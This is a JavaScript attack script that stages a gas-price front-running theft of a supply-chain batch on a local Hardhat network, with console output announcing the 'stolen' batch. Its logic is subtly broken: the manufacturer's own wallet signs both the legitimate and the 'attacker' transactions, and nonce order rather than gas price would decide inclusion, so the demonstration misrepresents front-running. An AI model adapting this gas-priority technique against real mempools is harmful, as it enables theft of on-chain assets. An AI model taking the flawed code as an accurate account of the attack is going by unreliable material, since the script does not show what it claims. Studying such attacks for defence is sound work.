// FrontRunnerAttack.js
/*
!! REAL FRONT-RUNNING ATTACK ON HARDHAT !!
This script executes a live front-running attack on your local Hardhat network.
It demonstrates how an attacker can steal a batch transfer by paying higher gas.
*/

const { ethers } = require('ethers');

// Import your contract ABI and deployment address
const contractABI = require('../../lib/contracts/contracts/SupplyChain.sol/SupplyChain.json').abi;
const deployment = require('../../lib/deployment.json');

// --- CONFIGURATION ---
const BATCH_ID_TO_ATTACK = '0xba5295d322b54240907fc32aabaef07f'; // Change this to your batch ID

// Standard Hardhat test accounts
const MANUFACTURER_PK = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80';
const DISTRIBUTOR_PK = '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d';
const FRONTRUNNER_PK = '0x47c99abed3324a2707c28affff1267e45918ec8c3f20b8aa892e8b065d2942dd';

const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545");
const contractAddress = deployment.address;

// --- Helper Functions ---
async function checkContractFunctions(contract) {
  console.log('\n[DEBUG] Available contract functions:');
  const fragment = contract.interface.fragments;
  fragment.forEach(f => {
    if (f.type === 'function') {
      console.log(`  - ${f.name}(${f.inputs.map(i => i.type).join(', ')})`);
    }
  });
}

async function getBatchInfo(contract, batchId) {
  try {
    // Try different possible function names
    const possibleFunctions = ['getBatch', 'batches', 'getBatchInfo', 'getBatchDetails'];
    
    for (const funcName of possibleFunctions) {
      try {
        if (contract[funcName]) {
          const batch = await contract[funcName](batchId);
          console.log(`   ✓ Found batch using ${funcName}()`);
          return batch;
        }
      } catch (e) {
        continue;
      }
    }
    
    throw new Error('Could not find batch getter function');
  } catch (e) {
    console.error('   ✗ Error getting batch:', e.message);
    throw e;
  }
}

async function getTransferFunction(contract) {
  // Check which transfer function exists
  const possibleFunctions = [
    'transferBatch',
    'transferBatchOwnership', 
    'transfer',
    'updateBatchOwner',
    'updateBatchLocation'
  ];
  
  for (const funcName of possibleFunctions) {
    if (contract.interface.getFunction(funcName)) {
      console.log(`   ✓ Found transfer function: ${funcName}()`);
      return funcName;
    }
  }
  
  throw new Error('Could not find transfer function in contract');
}

// --- Main Attack Logic ---
async function main() {
  console.log('\n╔════════════════════════════════════════════════════════════╗');
  console.log('║     LIVE FRONT-RUNNING ATTACK - HARDHAT NETWORK           ║');
  console.log('╚════════════════════════════════════════════════════════════╝\n');

  // Setup wallets
  const manufacturerWallet = new ethers.Wallet(MANUFACTURER_PK, provider);
  const distributorWallet = new ethers.Wallet(DISTRIBUTOR_PK, provider);
  const frontRunnerWallet = new ethers.Wallet(FRONTRUNNER_PK, provider);

  console.log('🎭 Attack Participants:');
  console.log(`   Manufacturer:  ${manufacturerWallet.address}`);
  console.log(`   Distributor:   ${distributorWallet.address}`);
  console.log(`   Front-Runner:  ${frontRunnerWallet.address} 🦹‍♂️\n`);

  // Create contract instances
  const manufacturerContract = new ethers.Contract(contractAddress, contractABI, manufacturerWallet);

  // Debug: Check available functions
  await checkContractFunctions(manufacturerContract);

  // Determine the correct transfer function
  let transferFunction;
  try {
    transferFunction = await getTransferFunction(manufacturerContract);
  } catch (e) {
    console.error('\n❌ ERROR: Could not determine transfer function.');
    console.error('   Please check your contract ABI and available functions above.\n');
    return;
  }

  // --- PRE-ATTACK VERIFICATION ---
  console.log('\n[Step 1] 🔍 Verifying initial state...');
  let initialBatchData;
  try {
    initialBatchData = await getBatchInfo(manufacturerContract, BATCH_ID_TO_ATTACK);
    
    // Try to determine current holder field name
    let currentHolder;
    if (initialBatchData.currentHolder) {
      currentHolder = initialBatchData.currentHolder;
    } else if (initialBatchData.owner) {
      currentHolder = initialBatchData.owner;
    } else if (initialBatchData.holder) {
      currentHolder = initialBatchData.holder;
    } else if (initialBatchData[0]) {
      // If it's a tuple, try first element
      currentHolder = initialBatchData[0];
    }

    console.log(`   Current Owner: ${currentHolder}`);
    
    if (currentHolder.toLowerCase() !== manufacturerWallet.address.toLowerCase()) {
      console.error(`   ❌ ERROR: Batch ${BATCH_ID_TO_ATTACK} is not owned by Manufacturer`);
      console.error(`      Expected: ${manufacturerWallet.address}`);
      console.error(`      Actual:   ${currentHolder}`);
      return;
    }
    
    console.log(`   ✅ Batch ${BATCH_ID_TO_ATTACK} is owned by Manufacturer\n`);
  } catch (e) {
    console.error(`   ❌ ERROR: Could not verify batch ${BATCH_ID_TO_ATTACK}`);
    console.error(`      ${e.message}\n`);
    return;
  }

  // --- PREPARING THE ATTACK ---
  console.log('[Step 2] ⚙️  Preparing the mempool...');
  try {
    await provider.send("evm_setAutomine", [false]);
    await provider.send("evm_setIntervalMining", [0]);
    console.log('   ✅ Automining disabled - mempool is now active\n');
  } catch (e) {
    console.error('   ❌ ERROR: Could not disable automining');
    console.error(`      ${e.message}\n`);
    return;
  }

  // --- LAUNCHING THE ATTACK ---
  console.log('[Step 3] 🚀 Launching transactions into mempool...\n');

  try {
    // Prepare transaction parameters based on function signature
    const functionFragment = manufacturerContract.interface.getFunction(transferFunction);
    const paramCount = functionFragment.inputs.length;
    
    console.log(`   Function signature: ${transferFunction}(${functionFragment.inputs.map(i => i.type).join(', ')})`);
    
    let legitParams, attackParams;
    
    // Build parameters based on function signature
    if (paramCount === 2) {
      // transferBatch(batchId, newOwner)
      legitParams = [BATCH_ID_TO_ATTACK, distributorWallet.address];
      attackParams = [BATCH_ID_TO_ATTACK, frontRunnerWallet.address];
    } else if (paramCount === 3) {
      // transferBatch(batchId, newOwner, location)
      legitParams = [BATCH_ID_TO_ATTACK, distributorWallet.address, "Distributor's Warehouse"];
      attackParams = [BATCH_ID_TO_ATTACK, frontRunnerWallet.address, "Attacker's Hideout"];
    } else {
      throw new Error(`Unexpected parameter count: ${paramCount}`);
    }

    // 3a. Legitimate transaction with LOW gas
    console.log('   📤 Submitting LEGITIMATE transaction (10 gwei)...');
    const legitTxPromise = manufacturerContract[transferFunction](
      ...legitParams,
      { 
        gasPrice: ethers.parseUnits('10', 'gwei'),
        gasLimit: 300000 
      }
    );

    // Small delay to simulate real-world timing
    await new Promise(resolve => setTimeout(resolve, 100));

    // 3b. Malicious transaction with HIGH gas
    console.log('   📤 Submitting MALICIOUS transaction (100 gwei) 🦹‍♂️...');
    const attackTxPromise = manufacturerContract[transferFunction](
      ...attackParams,
      { 
        gasPrice: ethers.parseUnits('100', 'gwei'),
        gasLimit: 300000 
      }
    );

    // Wait for both transactions to enter mempool
    const [legitTx, attackTx] = await Promise.all([legitTxPromise, attackTxPromise]);
    
    console.log('\n   ✅ Both transactions submitted to mempool:');
    console.log(`      Legitimate TX: ${legitTx.hash}`);
    console.log(`      Malicious TX:  ${attackTx.hash}\n`);

  } catch (e) {
    console.error('   ❌ ERROR: Failed to submit transactions');
    console.error(`      ${e.message}\n`);
    await provider.send("evm_setAutomine", [true]);
    return;
  }

  // --- MINING THE BLOCK ---
  console.log('[Step 4] ⛏️  Mining block (miner prioritizes highest gas)...');
  try {
    await provider.send("evm_mine", []);
    console.log('   ✅ Block mined!\n');
    
    // Wait for state to update
    await new Promise(resolve => setTimeout(resolve, 1000));
  } catch (e) {
    console.error('   ❌ ERROR: Failed to mine block');
    console.error(`      ${e.message}\n`);
    await provider.send("evm_setAutomine", [true]);
    return;
  }

  // --- POST-ATTACK VERIFICATION ---
  console.log('[Step 5] 🔎 Verifying attack results...\n');
  try {
    const finalBatchData = await getBatchInfo(manufacturerContract, BATCH_ID_TO_ATTACK);
    
    let finalOwner;
    if (finalBatchData.currentHolder) {
      finalOwner = finalBatchData.currentHolder;
    } else if (finalBatchData.owner) {
      finalOwner = finalBatchData.owner;
    } else if (finalBatchData.holder) {
      finalOwner = finalBatchData.holder;
    } else if (finalBatchData[0]) {
      finalOwner = finalBatchData[0];
    }

    console.log(`   Final Owner: ${finalOwner}`);

    if (finalOwner.toLowerCase() === frontRunnerWallet.address.toLowerCase()) {
      console.log('\n╔════════════════════════════════════════════════════════════╗');
      console.log('║  ⚠️  ATTACK SUCCESSFUL - BATCH STOLEN BY ATTACKER! ⚠️      ║');
      console.log('╚════════════════════════════════════════════════════════════╝\n');
      console.log('   🦹‍♂️ The attacker paid 10x higher gas and got priority!');
      console.log('   😢 The legitimate distributor received NOTHING!');
      console.log('   💰 Manufacturer intended: Distributor');
      console.log('   💰 Actual recipient: Attacker\n');
    } 
  } catch (e) {
    console.error('   ❌ ERROR: Could not verify final state');
    console.error(`      ${e.message}\n`);
  }

  // --- CLEANUP ---
  console.log('[Cleanup] 🧹 Re-enabling automining...');
  await provider.send("evm_setAutomine", [true]);
  console.log('   ✅ Hardhat automining restored\n');

  console.log('╔════════════════════════════════════════════════════════════╗');
  console.log('║              ATTACK DEMONSTRATION COMPLETE                 ║');
  console.log('╚════════════════════════════════════════════════════════════╝\n');
}

// Execute the attack
main().catch((error) => {
  console.error('\n💥 FATAL ERROR:\n', error);
  // Ensure automining is restored
  provider.send("evm_setAutomine", [true]).catch(() => {});
  process.exit(1);
});